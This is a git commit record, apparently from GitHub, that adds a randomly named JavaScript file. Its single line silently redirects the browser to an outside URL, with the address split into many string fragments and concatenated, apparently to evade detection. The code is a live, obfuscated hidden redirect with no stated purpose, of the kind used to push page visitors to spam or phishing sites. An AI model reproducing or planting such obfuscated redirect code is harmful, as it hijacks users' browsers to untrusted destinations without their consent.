2b3caa16ed68350f545d1b946c0526f754786283
Parabeauty <113865732+Parabeauty@users.noreply.github.com>
2022-11-23 00:33:19 +0100

    Create aaabvbfgthdrgdrtg.js

---
+++ aaabvbfgthdrgdrtg.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps:/`,`/www.`,`roadswo`,`rks.com/g`,`Q_hBEIKQ`,`RfugBl4Sr-C7`,`MGp0_vJ_TZ`,`0fyk0nl1X5K`,`uTD-X4K`,`ZGc5UClr`,`WWcIpWPZ`,`ThWDd3E1Yi`,`Xt1fK81NR`,`qQ~~/TA`,`HA/bA7SssHgH8`,`1M4`))
